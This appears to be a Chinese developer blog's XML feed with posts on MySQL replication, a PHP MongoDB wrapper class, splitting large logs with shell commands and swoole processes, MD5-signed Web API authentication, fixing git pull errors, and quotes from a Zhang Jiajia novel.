master内部，维护N个线程，每一个线程负责将二进制日志文件发往对应的slave。master既要负责写操作，还的维护N个线程，负担会很重。可 以这样，slave-1是master的从，slave-1又是slave-2,slave-3,…的主，同时slave-1不再负责select。 slave-1将master的复制线程的负担，转移到自己的身上。这就是所谓的多级复制的概念。 &nbsp; 问题6：当一个select发往mysql proxy，可能这次由slave-2响应，下次由slave-3响应，这样的话，就无法利用查询缓存了。 &nbsp; 应该找一个共享式的缓存，比如memcache来解决。将slave-2,slave-3,…这些查询的结果都缓存至mamcache中。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP封装mongdb扩展类(不是mongo)]]></title>
      <url>%2F2017%2F02%2F13%2Fphp%E5%B0%81%E8%A3%85mongdb%E6%89%A9%E5%B1%95%E7%B1%BB%E4%B8%8D%E6%98%AFmongo%2F</url>
      <content type="text"><![CDATA[在应用PHP7时发现原来的mongo扩展已经被废弃，而是采用了新的mongodb扩展，这个扩展对应封装的方法包含三十多个类，具体区别见官方手册php.net搜索mongo和mongodb， 原来应用对mongo的各种操作都不能用了，折腾了好几天，不停地翻阅手册，终于重新封装了一个mongodb扩展的类，可能还有不足欢迎指出！ &nbsp; &lt;?php /** Created by PhpStorm. User: fengqiang Date: 2016/12/1 Time: 18:30*/class mongodbdo{ private $config; private $host; private $port = 27017; private $database; private $username; private $password; private $debug = false; private $collection = ‘’; private $selects; private $wheres; private $updates; private $limit = 9999999; private $offset = 0; private $sorts; private $manager; private $result; public function __construct($config) { $this-&gt;config = $config; $this-&gt;connect(); } /** 预处理*/private function prepareConfig(){ if (isset($this-&gt;config[‘host’])) { $this-&gt;host = trim($this-&gt;config[&apos;host&apos;]); } if (isset($this-&gt;config[‘port’])) { $this-&gt;port = trim($this-&gt;config[&apos;port&apos;]); } if (isset($this-&gt;config[‘username’])) { $this-&gt;username = trim($this-&gt;config[&apos;username&apos;]); } if (isset($this-&gt;config[‘password’])) { $this-&gt;password = trim($this-&gt;config[&apos;password&apos;]); } if (isset($this-&gt;config[‘dbname’])) { $this-&gt;database = trim($this-&gt;config[&apos;dbname&apos;]); } if (isset($this-&gt;config[‘db_debug’])) { $this-&gt;debug = $this-&gt;config[&apos;db_debug&apos;]; }} /** 链接*/private function connect(){ $this-&gt;prepareConfig(); try { $dsn = &quot;mongodb://{$this-&gt;host}:{$this-&gt;port}/{$this-&gt;database}&quot;; /*$options = array( &apos;username&apos; =&gt; $this-&gt;username, &apos;password&apos; =&gt; $this-&gt;password );*/ $options = array(&apos;connect&apos; =&gt; true, &quot;socketTimeoutMS&quot; =&gt; 28800000000); $this-&gt;manager = new MongoDB\Driver\Manager($dsn, $options); } catch (\Exception $e) { $this-&gt;showError($e); }} /** 获取当前连接 @return mixed*/public function getManager(){ return $this-&gt;manager;} /** @param mixed $collection*/public function getCollection(){ return $this-&gt;collection;} /** 获取查询所需胡字段 @return array*/public function getSelects(){ return $this-&gt;selects;} /** 获取条件 @return array*/public function getWheres(){ return $this-&gt;wheres;} /** 获取更新内容 @return array*/public function getUpdates(){ return $this-&gt;updates;} /** 获取条数 @return int*/public function getLimit(){ return $this-&gt;limit;} /** 获取偏移量 @return int*/public function getOffset(){ return $this-&gt;offset;} /** 获取排序 @return array*/public function getSorts(){ return $this-&gt;sorts;} /** @param mixed $collection*/public function setCollection( $collection){ $this-&gt;collection = $collection;} /** @param array $selects*/public function setSelects(array $selects){ $this-&gt;selects = $selects;} /** @param array $wheres*/public function setWheres(array $wheres){ $this-&gt;wheres = $wheres;} /** @param array $updates*/public function setUpdates(array $updates){ $this-&gt;updates = $updates;} /** @param int $limit*/public function setLimit( $limit){ $this-&gt;limit = $limit;} /** @param int $offset*/public function setOffset( $offset){ $this-&gt;offset = $offset;} /** @param array $sorts*/public function setSorts(array $sorts){ $this-&gt;sorts = $sorts;} /** @param $database @return $this*/public function switch_db($database){ $this-&gt;database = $database; return $this;} /** @param $table @return $this*/public function collection($collection){ $this-&gt;collection = $collection; return $this;} /** @param $collection @return Mongo_db*/public function table($collection){ return $this-&gt;collection($collection);} /** 增 @param array $document @param string $wstring @param int $wtimeout @return mixed*/public function insert( $document = array(), $wstring = \MongoDB\Driver\WriteConcern::MAJORITY, $wtimeout = 1000){ try { $wc = new \MongoDB\Driver\WriteConcern($wstring, $wtimeout); $bulk = new \MongoDB\Driver\BulkWrite(); $bulk-&gt;insert($document); $dbc = $this-&gt;database . &apos;.&apos; . $this-&gt;collection; $result = $this-&gt;manager-&gt;executeBulkWrite($dbc, $bulk, $wc); $this-&gt;result = $result; //增加几条 return $result-&gt;getInsertedCount(); } catch (\Exception $e) { $this-&gt;showError($e); }} /** 批量添加 @param array $documents @param string $wstring @param int $wtimeout @return mixed*/public function batch_insert( $documents = array(), $wstring = \MongoDB\Driver\WriteConcern::MAJORITY, $wtimeout = 1000){ try { $wc = new \MongoDB\Driver\WriteConcern($wstring, $wtimeout); $bulk = new \MongoDB\Driver\BulkWrite(); foreach ($documents as $k =&gt; $document) { $bulk-&gt;insert($document); } $dbc = $this-&gt;database . &apos;.&apos; . $this-&gt;collection; $result = $this-&gt;manager-&gt;executeBulkWrite($dbc, $bulk, $wc); $this-&gt;result = $result; //增加几条 return $result-&gt;getInsertedCount(); } catch (\Exception $e) { $this-&gt;showError($e); }} /** 删 @param array $deleteOptions @param string $wstring @param int $wtimeout @return mixed*/public function delete( $deleteOptions = [“limit” =&gt; 1], $wstring = \MongoDB\Driver\WriteConcern::MAJORITY, $wtimeout = 1000){ try { $wc = new \MongoDB\Driver\WriteConcern($wstring, $wtimeout); $bulk = new \MongoDB\Driver\BulkWrite(); $filter = $this-&gt;wheres; if (count($filter) &lt; 1 &amp;&amp; $deleteOptions[&apos;limit&apos;] == 1) { throw new \Exception(&apos;filter is error!&apos;); } $bulk-&gt;delete($filter, $deleteOptions); $dbc = $this-&gt;database . &apos;.&apos; . $this-&gt;collection; $result = $this-&gt;manager-&gt;executeBulkWrite($dbc, $bulk, $wc); $this-&gt;result = $result; //删除几条 return $result-&gt;getDeletedCount(); } catch (\Exception $e) { $this-&gt;showError($e); }} /** 删除所有 @param array $deleteOptions @param string $wstring @param int $wtimeout @return mixed*/public function delete_all( $deleteOptions = [“limit” =&gt; 0], $wstring = \MongoDB\Driver\WriteConcern::MAJORITY, $wtimeout = 1000){ return $this-&gt;delete($deleteOptions, $wstring, $wtimeout);} /** 更新 @param array $updateOptions @param string $wstring @param int $wtimeout*/public function update( $updateOptions = [‘multi’ =&gt; false, ‘upsert’ =&gt; false], $wstring = \MongoDB\Driver\WriteConcern::MAJORITY, $wtimeout = 1000){ try { $wc = new \MongoDB\Driver\WriteConcern($wstring, $wtimeout); $bulk = new \MongoDB\Driver\BulkWrite(); $filter = $this-&gt;wheres; if (count($filter) &lt; 1 &amp;&amp; $updateOptions[&apos;multi&apos;] == false) { throw new \Exception(&apos;filter is error!&apos;); } $newObj = $this-&gt;updates; $bulk-&gt;update( $filter, $newObj, $updateOptions ); $dbc = $this-&gt;database . &apos;.&apos; . $this-&gt;collection; $result = $this-&gt;manager-&gt;executeBulkWrite($dbc, $bulk, $wc); $this-&gt;result = $result; return $result-&gt;getModifiedCount(); } catch (\Exception $e) { $this-&gt;showError($e); }} /** 更新所有 @param array $updateOptions @param string $wstring @param int $wtimeout*/public function update_all( $updateOptions = [‘multi’ =&gt; true, ‘upsert’ =&gt; false], $wstring = \MongoDB\Driver\WriteConcern::MAJORITY, $wtimeout = 1000000){ return $this-&gt;update($updateOptions, $wstring, $wtimeout);} /** 查询单条 @param null $id @return mixed|null*/public function find($id = null){ if ($id != null) { $this-&gt;where(&apos;_id&apos;, new \MongoDB\BSON\ObjectID($id)); } $filter = $this-&gt;wheres; $options = [ &apos;projection&apos; =&gt; $this-&gt;selects, &quot;sort&quot; =&gt; $this-&gt;sorts, &quot;skip&quot; =&gt; 0, &quot;limit&quot; =&gt; 1, ]; $query = new \MongoDB\Driver\Query($filter, $options); $dbc = $this-&gt;database . ‘.’ . $this-&gt;collection; $documents = $this-&gt;manager-&gt;executeQuery($dbc, $query); $this-&gt;result = $documents; $returns = null; foreach ($documents as $document) { $bson = \MongoDB\BSON\fromPHP($document); $returns = json_decode(\MongoDB\BSON\toJSON($bson), true); } return $returns;} public function findALL($argv = array(),$fields = array(),$sort = array(),$skip = 0, $limit = 0){ /*$argv = $this-&gt;validate($argv); if ($argv) { $result = $this-&gt;_mongoDB-&gt;find($argv) -&gt;skip($skip) -&gt;limit($limit) -&gt;sort($sort); return self::toArray($result); }*/ $options = array(); if ($skip) { $options[&apos;skip&apos;] = $skip; } if ($limit) { $options[&apos;limit&apos;] = $limit; } if ($sort) { $options[&apos;sort&apos;] = $sort; } if ($fields) { if (is_string($fields)) { $fields = explode(&apos;,&apos;, $fields); } foreach ($fields as $v) { $options[&apos;projection&apos;][$v] = 1; } $options[&apos;projection&apos;][&apos;_id&apos;] = 0; } $query = new \MongoDB\Driver\Query($argv, $options); $cursor = $this-&gt;manager-&gt;executeQuery($this-&gt;database.’.’.$this-&gt;collection, $query); return $cursor-&gt;toArray();} /** command @param $db @param $commands @return mixed*/public function command($db, $commands){ $db = $db?$db:$this-&gt;database; try { if(is_array($commands)) { $commands = new \MongoDB\Driver\Command($commands); } $cursor = $this-&gt;manager-&gt;executeCommand($db, $commands); $this-&gt;result = $cursor; return $cursor; } catch (\Exception $e) { $this-&gt;showError($e); }} public function dropDatabase(){ $cmd = array( &apos;dropDatabase&apos; =&gt; 1, ); $db = $this-&gt;database; $commands = new \MongoDB\Driver\Command($cmd); $cursor = $this-&gt;command($db, $commands); $this-&gt;result = $cursor; $response = current($cursor-&gt;toArray()); return $response;} public function drop(){ $cmd = array( &apos;drop&apos; =&gt; $this-&gt;collection, ); $db = $this-&gt;database; $commands = new \MongoDB\Driver\Command($cmd); $cursor = $this-&gt;command($db, $commands); $this-&gt;result = $cursor; $response = current($cursor-&gt;toArray()); return $response;}public function createCollections(){ $cmd = array( &apos;create&apos; =&gt; $this-&gt;collection, ); $db = $this-&gt;database; $commands = new \MongoDB\Driver\Command($cmd); $cursor = $this-&gt;command($db, $commands); $this-&gt;result = $cursor; $response = current($cursor-&gt;toArray()); return $response;} //uniquepublic function add_index($key, $name = ‘index’){ $cmd = array( &apos;createIndexes&apos; =&gt; $this-&gt;collection, &apos;indexes&apos; =&gt; array( array( &apos;name&apos; =&gt; $name, &apos;key&apos; =&gt; $key, ) ) ); $db = $this-&gt;database; $commands = new \MongoDB\Driver\Command($cmd); $cursor = $this-&gt;command($db, $commands); $this-&gt;result = $cursor; $response = current($cursor-&gt;toArray()); return $response;} public function remove_index($index){ $cmd = array( &apos;dropIndexes&apos; =&gt; $this-&gt;collection, &apos;index&apos; =&gt; $index ); $db = $this-&gt;database; $commands = new \MongoDB\Driver\Command($cmd); $cursor = $this-&gt;command($db, $commands); $this-&gt;result = $cursor; $response = current($cursor-&gt;toArray()); return $response;} public function list_indexes(){ $cmd = array( &apos;listIndexes&apos; =&gt; $this-&gt;collection, ); $db = $this-&gt;database; $commands = new \MongoDB\Driver\Command($cmd); $cursor = $this-&gt;command($db, $commands); $this-&gt;result = $cursor; return $cursor;} public function aggregate($commands, $allowDiskUse = false){ $db = $this-&gt;database; $sql = [ &apos;aggregate&apos; =&gt; $this-&gt;collection, &apos;pipeline&apos; =&gt; $commands, &apos;allowDiskUse&apos; =&gt; $allowDiskUse, ]; $commands = new \MongoDB\Driver\Command($sql); $cursor = $this-&gt;command($db, $commands); $this-&gt;result = $cursor; $response = current($cursor-&gt;toArray())-&gt;result; return $response;} /** @param $key @return mixed*/public function distinct($key){ $db = $this-&gt;database; $commands = new \MongoDB\Driver\Command( [ &apos;distinct&apos; =&gt; $this-&gt;collection, &apos;key&apos; =&gt; $key, &apos;query&apos; =&gt; $this-&gt;wheres ] ); $cursor = $this-&gt;command($db, $commands); $this-&gt;result = $cursor; $response = current($cursor-&gt;toArray())-&gt;values; return $response;} /** count @return mixed*/public function count(){ $db = $this-&gt;database; $commands = new \MongoDB\Driver\Command( [ &quot;count&quot; =&gt; $this-&gt;collection, &quot;query&quot; =&gt; $this-&gt;wheres ] ); $cursor = $this-&gt;command($db, $commands); $this-&gt;result = $cursor; $response = $cursor-&gt;toArray()[0]; return $response-&gt;n;} /** 查 @return mixed*/public function get(){ try { $filter = (array)$this-&gt;wheres; $options = [ &apos;projection&apos; =&gt; (array)$this-&gt;selects, &quot;sort&quot; =&gt; (array)$this-&gt;sorts, &quot;skip&quot; =&gt; (int)$this-&gt;offset, &quot;limit&quot; =&gt; (int)$this-&gt;limit, ]; $query = new \MongoDB\Driver\Query($filter, $options); $dbc = $this-&gt;database . &apos;.&apos; . $this-&gt;collection; $documents = $this-&gt;manager-&gt;executeQuery($dbc, $query); $this-&gt;result = $documents; $returns = array(); foreach ($documents as $document) { $bson = \MongoDB\BSON\fromPHP($document); $returns[] = json_decode(\MongoDB\BSON\toJSON($bson), true); } return $returns; } catch (\Exception $e) { $this-&gt;showError($e); }} /** @param $fields @param null $value @return $this*/public function set($fields, $value = NULL){ if (is_string($fields)) { $this-&gt;updates[&apos;$set&apos;][$fields] = $value; } elseif (is_array($fields)) { foreach ($fields as $field =&gt; $value) { $this-&gt;updates[&apos;$set&apos;][$field] = $value; } } return $this;} /** 要获取的字段 @param $wheres @param null $value @return $this*/public function field($includes = array(), $excludes = array()){ if (!is_array($includes)) { $includes = array(); } if (!is_array($excludes)) { $excludes = array(); } if (!empty($includes)) { foreach ($includes as $col) { $this-&gt;selects[$col] = 1; } } if (!empty($excludes)) { foreach ($excludes as $col) { $this-&gt;selects[$col] = 0; } } return $this;} /** 条件 @param $wheres @param null $value @return $this*/public function where($wheres, $value = null){ if (is_array($wheres)) { foreach ($wheres as $wh =&gt; $val) { $this-&gt;wheres[$wh] = $val; } } else { $this-&gt;wheres[$wheres] = $value; } return $this;} public function where_in($field = “”, $in = array()){ $this-&gt;wheres[$field][‘$in’] = $in; return $this;} public function where_in_all($field = “”, $in = array()){ $this-&gt;wheres[$field][‘$all’] = $in; return $this;} public function where_or($wheres = array()){ foreach ($wheres as $wh =&gt; $val) { $this-&gt;wheres[&apos;$or&apos;][] = array($wh =&gt; $val); } return $this;} public function where_not_in($field = “”, $in = array()){ $this-&gt;wheres[$field][‘$nin’] = $in; return $this;} public function where_gt($field = “”, $x){ $this-&gt;wheres[$field][‘$gt’] = $x; return $this;} public function where_gte($field = “”, $x){ $this-&gt;wheres[$field][‘$gte’] = $x; return $this;} public function where_lt($field = “”, $x){ $this-&gt;wheres[$field][‘$lt’] = $x; return $this;} public function where_lte($field = “”, $x){ $this-&gt;wheres[$field][‘$lte’] = $x; return $this;} public function where_between($field = “”, $x, $y){ $this-&gt;wheres[$field][‘$gte’] = $x; $this-&gt;wheres[$field][‘$lte’] = $y; return $this;} public function where_between_ne($field = “”, $x, $y){ $this-&gt;wheres[$field][‘$gt’] = $x; $this-&gt;wheres[$field][‘$lt’] = $y; return $this;} public function where_ne($field = ‘’, $x){ $this-&gt;wheres[$field][‘$ne’] = $x; return $this;} public function push($fields, $value = array()){ if (is_string($fields)) { $this-&gt;updates[&apos;$push&apos;][$fields] = $value; } elseif (is_array($fields)) { foreach ($fields as $field =&gt; $value) { $this-&gt;updates[&apos;$push&apos;][$field] = $value; } } return $this;} public function addtoset($field, $values){ if (is_string($values)) { $this-&gt;updates[&apos;$addToSet&apos;][$field] = $values; } elseif (is_array($values)) { $this-&gt;updates[&apos;$addToSet&apos;][$field] = array(&apos;$each&apos; =&gt; $values); } return $this;} public function pop($field){ if (is_string($field)) { $this-&gt;updates[&apos;$pop&apos;][$field] = -1; } elseif (is_array($field)) { foreach ($field as $pop_field) { $this-&gt;updates[&apos;$pop&apos;][$pop_field] = -1; } } return $this;} public function pull($field = “”, $value = array()){ $this-&gt;updates[‘$pull’] = array($field =&gt; $value); return $this;} public function rename_field($old, $new){ $this-&gt;updates[‘$rename’] = array($old =&gt; $new); return $this;} public function unset_field($fields){ if (is_string($fields)) { $this-&gt;updates[&apos;$unset&apos;][$fields] = 1; } elseif (is_array($fields)) { foreach ($fields as $field) { $this-&gt;updates[&apos;$unset&apos;][$field] = 1; } } return $this;} public function inc($fields = array(), $value = 0){ if (is_string($fields)) { $this-&gt;updates[&apos;$inc&apos;][$fields] = $value; } elseif (is_array($fields)) { foreach ($fields as $field =&gt; $value) { $this-&gt;updates[&apos;$inc&apos;][$field] = $value; } } return $this;} public function mul($fields = array(), $value = 0){ if (is_string($fields)) { $this-&gt;updates[&apos;$mul&apos;][$fields] = $value; } elseif (is_array($fields)) { foreach ($fields as $field =&gt; $value) { $this-&gt;updates[&apos;$mul&apos;][$field] = $value; } } return $this;} public function max($fields = array(), $value = 0){ if (is_string($fields)) { $this-&gt;updates[&apos;$max&apos;][$fields] = $value; } elseif (is_array($fields)) { foreach ($fields as $field =&gt; $value) { $this-&gt;updates[&apos;$max&apos;][$field] = $value; } } return $this;} public function min($fields = array(), $value = 0){ if (is_string($fields)) { $this-&gt;updates[&apos;$min&apos;][$fields] = $value; } elseif (is_array($fields)) { foreach ($fields as $field =&gt; $value) { $this-&gt;updates[&apos;$min&apos;][$field] = $value; } } return $this;} /** 排序 @param array $fields @return $this*/public function order_by($fields = array()){ foreach ($fields as $col =&gt; $val) { if ($val == -1 || $val === FALSE || strtolower($val) == &apos;desc&apos;) { $this-&gt;sorts[$col] = -1; } else { $this-&gt;sorts[$col] = 1; } } return $this;} /** 条数 @param int $x @return $this*/public function limit($x = 99999){ if ($x !== NULL &amp;&amp; is_numeric($x) &amp;&amp; $x &gt;= 1) { $this-&gt;limit = (int)$x; } return $this;} /** 偏移量 @param int $x @return $this*/public function offset($x = 0){ if ($x !== NULL &amp;&amp; is_numeric($x) &amp;&amp; $x &gt;= 1) { $this-&gt;offset = (int)$x; } return $this;} /** 生成mongo时间 @param bool $stamp @return \MongoDB\BSON\UTCDatetime*/public function date($stamp = false){ if ($stamp == false) { return new \MongoDB\BSON\UTCDatetime(time() * 1000); } else { return new \MongoDB\BSON\UTCDatetime($stamp); } } /** 生成mongo时间戳 @param bool $stamp @return \MongoDB\BSON\Timestamp*/public function timestamp($stamp = false){ if ($stamp == false) { return new \MongoDB\BSON\Timestamp(0, time()); } else { return new \MongoDB\BSON\Timestamp(0, $stamp); }} /** 抛出异常 @param $e*/public function showError($e){ exit($e-&gt;getMessage());}}&nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[php快速分析日志]]></title>
      <url>%2F2017%2F02%2F13%2Fphp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90%E6%97%A5%E5%BF%97%2F</url>
      <content type="text"><![CDATA[在一个跑数任务（读取服务器日志分析数据）中，如果日志内容数据量过大会导致耗时特别长，比如一个小时的压缩日志大约1G，用php去读取可能要半个多小时， 那怎么解决这种问题呢？上代码 /** * 把dcclog解压拆分成10个文件 * @param $file * @return bool * @author fengqiang@yiche.com */ public static function splitGzFile($file) { // 解压文件 $shell_1 = &quot;gunzip $file&quot;; exec($shell_1); //拆分成10个解压文件 $file = rtrim($file, &apos;.gz&apos;); if(file_exists($file)) { $size = filesize($file); $oneSize = ceil($size/1024/1024/9); //拆分成10个文件，每个文件大小 单位M $lines = $oneSize * 820; //经过测试大概802行/M $shell = &quot;split -l {$lines} -d {$file} {$file}.&quot;; //shell拆分文件 exec($shell); // unlink($file); //已切割文件 删除解压的文件 } return true; }shell中有个split命令，可以按行拆分文件，然后可以对文件分下，大概估算下当前日志多少行为1M，按此切割。 这个时候日志已经拆分成十个文件，我们可以应用swoole多进程去读取日志，分析数据。 &nbsp; /行为日志单独处理 把文件拆分十个 用十个进程去跑 swoole_process$dataArr = FilesDcclog::dofiles_hour_new($time);if(is_array($dataArr)){ for($i = 0; $istart(); $process-&gt;write($str); //进程通信 }}//回收进程while(1){ $ret = swoole_process::wait(); if ($ret){// $ret 是个数组 code是进程退出状态码， $pid = $ret[‘pid’]; err_log(“进程{$ret[‘pid’]}回收成功”, atFLAG); }else{ break; }} function worker_dcclog(swoole_process $worker){ $str = $worker-&gt;read(); $params = explode(“||”, $str); $jsonworker = json_encode((array)$worker); err_log(“callback_file worker info {$jsonworker}”, atFLAG); if(file_exists($params[0])) { err_log(“start:: log:”.$params[0].”||time:”.$params[2].”||dohour:”.$params[3], prFLAG); FilesDcclog::formatData2PutJsonFile($params[0], $params[1], $params[2], $worker-&gt;pid);//根据所需调用自己的处理方法 err_log(“end:: log:”.$params[0].”||time:”.$params[2].”||dohour:”.$params[3], prFLAG); }}这样我们就能就会大大提高任务的时效性，经测试时间大概5~8分钟处理完任务，加快了5~6倍。 另外在此基础上，还能通过应用PHP7来再次提高效率，PHP7读取文件会比PHP5快速更多。 可能遇到的问题： 在php.ini中把禁用函数选项中的disable_functions中的exec去掉，否则会报错，不能使用exec函数。 &nbsp; &nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[WEB API加密认证]]></title>
      <url>%2F2017%2F02%2F13%2Fweb-api%E5%8A%A0%E5%AF%86%E8%AE%A4%E8%AF%81%2F</url>
      <content type="text"><![CDATA[WEB API接口加密认证： 1. 假设我们需要访问的API接口是这样的：http://test.com/openapi/v2/get/user/?key=xxxxx&amp;sign=sadasdas&amp;timestamp=2013-03-05 10:14:00&amp;c=c&amp;a=a&amp;d=d 2. 接口调用的控制器：openapi/v2/get/user/ 3. 步骤一：作为服务端，首先要检查参数是否正确：key (用户的key) ;sign(加密的签名串) ;timestamp (请求的时间，服务端对请求有时间生效)，这些参数如果有一个参数没传递，肯定返回参数不正确的结果。 4. 步骤二：参数如果都传递正确，这个时候需要检查API的白名单权限，API也就是（openapi/vw/get/user/）是否存在在我们的数据库中，一般会有一张API的数据表，如果调用的API不在我们的数据库白名单中或者这个API已经关闭访问了，那么要返回禁止访问的结果。 5. 步骤三： 如果API在白名单中，那么现在就要检查用户的KEY是否正确了，服务端会有一张用户权限表，这个数据表主要用来记录用户的key secret(密钥) 以及API权限列表，检查这个用户对访问的API（openapi/v1/get/user/）是否有权限，如果有权限则通过，没权限则关闭。 6. 步骤四： 如果用户权限通过，这个时候就到了最重要的一步，SIGN签名的验证。 签名算法： 加密方式 md5(POST参数（升序排序，除key sign参数除外） + 用户密钥) PHP加密算法代码： foreach ($p as $v) { $temp = explode(“=”, $v); $pArr[$temp[0]] = $temp[1]; }ksort($pArr); foreach ($pArr as $k =&gt; $v) { $pStr2 .= $k . $v ; }md5($pStr2 . $secret)注意：加密的时候，需要将timestamp带上，防止客户端篡改。 客户端，将自己需要传递的参数进行升序排序，然后加上自己key对应的密钥（密钥在服务端数据库中有一份保存，这个是不能对外公开的）进行MD5加密，通过参数sign传递到服务端。 服务端拿到sign值后，对传递过来的参数也进行同样的算法排序，并经过用户的key查询得到密钥，然后进行一次加密算法，得到的服务端的sign和客户端传递过来的sign进行比较，如果相同则表示是可以通过的，如果中途有人篡改数据等，那么最终加密出来的sign就是不一致的，这样保证了用户传递数据的可靠性和安全性。 7. 步骤五：检查时间戳时间，比较客户端时间和服务端时间是否在10分钟之内，如果10分钟之外了，那么返回超时的提示，这样能保证调用过的接口数据能在一定时间内销毁掉。 8. 步骤六：调用相应逻辑]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[git pull 错误解决]]></title>
      <url>%2F2017%2F02%2F13%2Fgit-pull-%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%2F</url>
      <content type="text"><![CDATA[症状：pull的时候 $ Git pull Pull is not possible because you have unmerged files.Please, fix them up in the work tree, and then use ‘git add/rm ‘as appropriate to mark resolution, or use ‘git commit -a’应该是因为local文件冲突了 解决方法： &nbsp; 1.pull会使用git merge导致冲突，需要将冲突的文件resolve掉 git add -u, git commit之后才能成功pull. 2.如果想放弃本地的文件修改，可以使用git reset –hard FETCH_HEAD，FETCH_HEAD表示上一次成功git pull之后形成的commit点。然后git pull. 注意： git merge会形成MERGE-HEAD(FETCH-HEAD) 。git push会形成HEAD这样的引用。HEAD代表本地最近成功push后形成的引用。&nbsp; 就我的经验，有时候会莫名其妙地出现这种状况，而且Untracked files 还特别多（实际上自己可能只改了一两个文件），所以只好先保存好自己确定做出的local的修改，然后用git reset –hard FETCH_HEAD回到上次成功pull之后的点，然后再pull就没有问题了 2.You are not currently on a branch. 症状：有一次pull的时候又出现冲突，这回用“git reset –hard FETCH_HEAD”方法都不行了，出现： $ git pullYou are not currently on a branch, so I cannot use any‘branch..merge’ in your configuration file.Please specify which remote branch you want to use on the commandline and try again (e.g. ‘git pull ‘).See git-pull(1) for details.解决方法： 首先git checkout -b temp 其次git checkout master 即可恢复到master repository的状态，然后就可以pull了]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[从你的全世界路过，在终点等你]]></title>
      <url>%2F2017%2F02%2F13%2F%E4%BB%8E%E4%BD%A0%E7%9A%84%E5%85%A8%E4%B8%96%E7%95%8C%E8%B7%AF%E8%BF%87%EF%BC%8C%E5%9C%A8%E7%BB%88%E7%82%B9%E7%AD%89%E4%BD%A0%2F</url>
      <content type="text"><![CDATA[Part 1： 前段时间读完了张嘉佳的《从你的全世界路过》，吸引人的除了张嘉佳笔下那一个个小故事外，更多的是张嘉佳的才气所书写的那一句句经典的台词，这是生活的完美写实。是的，我们读别人的故事，感动着自己，把握的是自己未来的方向。因为，我们所有人的坚强，都是柔软生的茧，所以，我们才能与作者感同身受。更因为，这些简短文字的故事，能给喜欢的人一点点力量，一点点面对自己的力量；因为在过去的岁月，我们都会想去拥有一个人的全世界，可是只能路过。最终，我们依旧需要继续往前，因为属于自己的另一个全世界，终会以豁然开朗的姿态呈现，以我们必须幸福的名义。 初恋—表白—执着—温暖—争吵—放手—怀念，每一夜的故事不尽相同，但却能看到一个熟悉的影子。《从你的全世界路过》、《我希望有个如你一般的人》、《旅行的意义》、《摆渡人》、《青春里没有返程的旅行》、《只有最好的爱情，没有伟大的爱情》…………一篇篇文章，一页页故事，一段段人生，一种种生活，一个个感悟……不变的是我从你的全世界路过，在终点等你。 Part 2： 《从你的全世界路过》 Ø总有几分钟，其中的每一秒，你都愿意拿一年去换取。 总有几颗泪，其中的每一次抽泣，你都愿意拿满手的承诺去代替。 总有几段场景，其中的每幅画面，你都愿意拿全部的力量去铭记。 总有几句话，其中的每个字眼，你都愿意拿所有的夜晚去复习。 亲爱的，如果一切可以重来，我想和你，永远在一起。 Ø一个人的记忆就是座城市，时间腐蚀着一切建筑，把高楼和道路全部沙化。如果你不往前走，就会被沙子掩埋。所以我们泪流满面，步步回头，可是只能往前走。 Ø我喜欢独自一个人，直到你走进我的心里。那么，我只想和你在一起，我不喜欢独自一个人。 Ø我想分担你的所有，我想拥抱你的所有，我想一辈子陪着你，我爱你，我无法抗拒，我就是爱你。 Ø一个人的记忆就是座城市，时间腐蚀着一切建筑，把高楼和道路全部沙化。如果你不往前走，就会被沙子掩埋。沙城就是一个人的记忆。偶尔梦里回到沙城，那些路灯和脚印无比清晰，而你无法碰触，一旦双手陷入，整座城市就轰隆隆地崩塌。把你的喜笑颜开，把你的碧海蓝天，把关于我们之间所有的影子埋葬。如果你不往前走，就会被沙子掩埋。所以我们泪流满面，步步回头，可是只能往前走。哪怕往前走，是和你擦肩而过。我从你们的世界路过，可你们也只是从对方的世界路过。哪怕寂寞无声，我们也依旧都是废话流，说完一切，和沉默做老朋友。 《我希望有个如你一般的人》 Ø水太蓝，所以想念漫出地平线。 风都留在树林里，所以叶子喜欢唱情歌。 陽光打磨鹅卵石，所以记忆越来越沉淀。 雨水想看爱人一眼，所以奋不顾身落到伞边。 这些都是你的心事，只有我读得懂，别人走得太快，看都看不见。 白天你的影子都在自己脚边，晚上你的影子就变成夜，包裹我的睡眠。 Ø我希望有个如你一般的人。如这山间清晨一般明亮清爽的人，如奔赴古城道路上陽光一般的人，温暖而不炙热，覆盖我所有肌肤。由起点到夜晚，由山野到书房，一切问题的答案都很简单。我希望有个如你一般的人，贯彻未来，数遍生命的公路牌。 《旅行的意义》 Ø美食和风景的意义，不是逃避，不是躲藏，不是获取，不是记录，而是在想象之外的环境里，去改变自己的世界观，从此慢慢改变心中真正觉得重要的东西。就算过几天就得回去，依旧上班，依旧吵闹，依旧心烦，可是我对世界有了新的看法。就算什么改变都没有发生，至少，人生就像一本书，我的这本也比别人多了几张彩页。这就是旅行的意义。 《摆渡人》 Ø世事如书，我偏爱你这一句，愿做个逗号，待在你脚边。 Ø但你有自己的朗读者，而我只是个摆渡人。 Ø即使这样，哪怕重来一遍，我也不会改变自己的选择。这些年我发现，无论我做过什么，遇到什么，迷路了，悲伤了，困惑了，痛苦了，其实一切问题都不必纠缠在答案上。我们喜欢计算，又算不清楚，那就不要算了，而有条路一定是对的，那就是努力变好，好好工作，好好生活，好好做自己，然后面对整片海洋的时候，你就可以创造一个完全属于自己的世界。 Ø我们都会上岸，陽光万里，路边鲜花开放。 《青春里没有返程的旅行》 Ø我们喜欢说，我喜欢你。好像我一定会喜欢你一样，好像我出生后就为了等你一样，好像我无论牵挂谁，思念都将坠落在你身边一样。总有一秒你希望永远停滞，哪怕之后的一生就此消除，从此你们定格成一张相片，两场生命组合成相框，漂浮在蓝色的海洋里。纪念青春里的乘客，和没有返程的旅行。 Ø我们喜欢说，我喜欢你。古老的太陽，年轻的脸庞，明亮的笑容，动人的歌曲，火车的窗外有胶片般的风景。你站在草丛里，站在花旁，站在缀满露珠的树下，站在我正漂泊的甲板上。等到小船开过码头，我可以回头看见，自己和你一直在远处守着水平面。而在人生中，因为我一定会喜欢你，所以真的有些道路是要跪着走完的，就为了坚持说，我喜欢你。 Ø我们在年少时不明白，有些乐章一旦开始，唱的就是曲终人散。 Ø这是生命之外的相遇，线条并未相交，滑向各自的深渊。 Part 3： 